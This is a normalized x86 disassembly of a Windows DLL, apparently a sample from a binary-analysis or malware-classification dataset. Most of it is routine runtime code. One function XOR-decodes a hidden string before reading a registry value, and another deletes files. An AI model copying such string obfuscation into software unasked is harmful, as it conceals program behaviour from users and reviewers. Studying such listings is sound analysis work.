push [ ebp - 0x8c ]
call sub_1003c7fc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10037530
push ebp
mov ebp esp
push 0xffffffff
push sub_10081210
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x18 ] esi
add esi 0x1c
mov [ ebp - 0x14 ] 0x2
cmp esi [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ebx 0x7fff
call sub_100614c9
mov edi eax
and edi ebx
cmp [ ebp - 0x14 ] ebx
jbe r-xdata
xor edx edx
mov eax edi
div [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
lea eax [ edx * 8 ]
sub eax edx
lea eax [ ecx + eax * 4 ]
cmp esi eax
je r-xdata
cmp ebx 0xffffffff
je r-xdata
inc [ ebp - 0x14 ]
add esi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov ebx [ esi + 0xc ]
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
mov ebx [ eax ]
mov [ esi ] ebx
mov ebx [ eax + 0x4 ]
mov [ esi + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
mov [ esi + 0x8 ] ebx
mov ebx [ eax + 0xc ]
mov [ esi + 0xc ] ebx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edx
mov edx [ eax + 0x10 ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0x10 ] edx
mov [ eax + 0x10 ] ecx
mov edx [ eax + 0x14 ]
mov ecx [ esi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ eax + 0x14 ] ecx
call sub_100614c9
shl ebx 0xf
and eax 0x7fff
shl edi 0xf
or ebx 0x7fff
or edi eax
cmp ebx [ ebp - 0x14 ]
jb r-xdata
sub_10037640
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
push edi
lea esp [ esp ]
movsx edi [ ecx + eax ]
xor edi eax
xor edi 0xffdf
and edi 0xff
mov [ ebp + eax * 2 - 0x58 ] di
inc eax
cmp eax 0x28
jb r-xdata
lea ecx [ ebp - 0x5c ]
push ecx
xor eax eax
push 0x1
push eax
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0x58 ]
push eax
push edx
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov edi [ GetProcessHeap@IAT ]
push 0x206
push 0x8
mov [ esi ] 0x206
call edi
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x5c ]
push esi
push eax
push 0x0
push 0x0
push r--data
push ecx
mov [ ebx ] eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x5c ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
push edx
push 0x0
call edi
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x5c ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10037730
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor ecx ecx
push 0xffffffff
push ecx
mov [ esi + 0x10 ] ecx
add eax 0x11c
mov [ ebp - 0x4 ] ecx
xor edx edx
mov [ esi + 0x14 ] 0x7
push eax
mov ecx esi
mov [ esi ] dx
call sub_10019180
mov eax esi
mov esp ebp
pop ebp
retn
sub_10037763
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_100202ee
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_1004fd6f
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_100202ee
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_100202ee
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100202ee
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_1001ba4c
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_1004fd6f
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_10041a88
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_1004fd6f
mov [ eax ] 0xd
call sub_1002ada5
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_1002ada5
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10048313
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1001ba4c
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_10037919
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_10055040
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10037958
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_100379e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10018870
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_1004fd6f
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_1004fd6f
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10024145
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_100458a4
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_1007cee3
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_10037ab0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
xor edi edi
push 0x4
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0xc ] edi
call sub_10055606
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
mov [ esi + 0x30 ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1006b5be
mov [ ebx ] eax
call sub_10058bff
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_100014b7
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x8 ]
call sub_10050f50
mov [ esi + 0x30 ] ebx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ecx + 0x4 ] eax
sub_10037b60
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004f7a0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10037b81
push 0x8
push r--data
call sub_10079bf0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10079c35
retn
push 0xd
call sub_10043f7b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10037c2e
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_10022b5a
pop ecx
push 0xc
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_1003bd9b
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10037c3a
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_10022b5a
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_1004c42d
pop ecx
sub_10037c50
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10037c91
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_10024583
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_1000ab75
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_10037d87
push 0x34
mov eax sub_1007f454
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x40 ] eax
mov al [ ebx ]
test al al
je r-xdata
xor esi esi
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_10006560
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
mov eax [ ebp - 0x3c ]
call sub_1004fa89
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
mov al [ edi + ebx ]
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + esi ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_100081b8
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
movzx eax [ ecx + 0x6 ]
movsx ecx [ edi + ebx ]
cmp ecx eax
jne r-xdata
call sub_10023e65
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_100081b8
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1005576a
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor esi esi
xor edi edi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_10037f10
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x14
push esi
mov esi ecx
lea ecx [ ebp - 0x10 ]
push ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10045e45
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x14 ] eax
add esp 0x4
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10037f80
push ebp
mov ebp esp
push 0xffffffff
push sub_10082210
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x84 ] edi
call sub_10037730
mov [ ebp - 0x4 ] edi
mov edi [ eax + 0x10 ]
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
mov eax [ rw-data ]
mov ecx rw-data
call sub_10039b60
test eax eax
setne bl
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ eax ]
xor ecx ecx
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] cx
test bl bl
je r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_1006591f
add esp 0x4
lea esi [ ebp - 0x64 ]
call sub_100513e0
mov [ ebp - 0x4 ] 0x2
mov edi [ eax + 0x10 ]
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
lea esi [ ebp - 0x2c ]
call sub_10037730
mov esi 0x1
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] esi
call sub_10036380
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
push eax
mov eax [ rw-data ]
mov ecx rw-data
call sub_10039b60
test eax eax
setne bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov eax [ eax ]
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
mov [ ebp - 0x84 ] esi
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] dx
test bl bl
je r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x84 ]
lea esi [ ebp - 0x80 ]
call sub_100513e0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_10036380
cmp [ ebp - 0x6c ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10038160
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10083916
mov eax [ fs : 0x0 ]
push eax
sub esp 0x318
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x310 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x328 ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor ebx ebx
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x330 ] ebx
lea eax [ esp + 0x34 ]
mov ecx edi
lea esi [ esp + 0x44 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
call sub_10061810
mov [ esp + 0x330 ] 0x1
mov esi [ esp + 0x34 ]
cmp esi ebx
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ esp + 0x9c ]
mov eax 0xda
call sub_10013830
cmp [ edi + 0x8 ] ebx
je r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
push edx
push esi
call sub_10015b10
push esi
call sub_1006591f
add esp 0x14
mov ecx [ esp + 0x328 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x310 ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ esp + 0x9c ]
mov eax 0x17
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
cmp [ esp + 0x24 ] ebx
je r-xdata
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x20 ]
lea edi [ esp + 0x28 ]
lea esi [ esp + 0x48 ]
call sub_10041440
cmp eax ebx
je r-xdata
mov eax 0x2
jmp r-xdata
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov eax [ esp + 0x1c ]
cmp eax 0x1e84800
jge r-xdata
lea edx [ esp + 0x18 ]
mov eax 0xb5
call sub_10013830
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x12c ]
mov [ esp + 0x38 ] 0x1
call sub_1002ed80
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
push ebx
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10009050
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push edx
push eax
lea eax [ esp + 0x11c ]
call sub_10031770
add esp 0x8
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
lea esi [ esp + 0x24 ]
call sub_10028360
mov eax 0x3
jmp r-xdata
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cmp esi edi
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cmp esi edi
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ esp + 0x20 ] ebx
je r-xdata
lea esp [ esp ]
lea edx [ esp + 0x9c ]
mov eax 0x142
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
lea edx [ esp + 0x114 ]
push edx
call sub_10018ea0
cmp eax ebx
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
xor eax eax
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
jmp r-xdata
lea ecx [ esp + 0x114 ]
push ecx
call [ DeleteFileW@IAT ]
lea eax [ esp + 0x114 ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x9c ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov eax 0x4
jmp r-xdata
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov eax 0x5
jmp r-xdata
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
sub_100384de
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1005f1a6
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1007b572
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_10008102
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1007b572
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100385a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008185d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
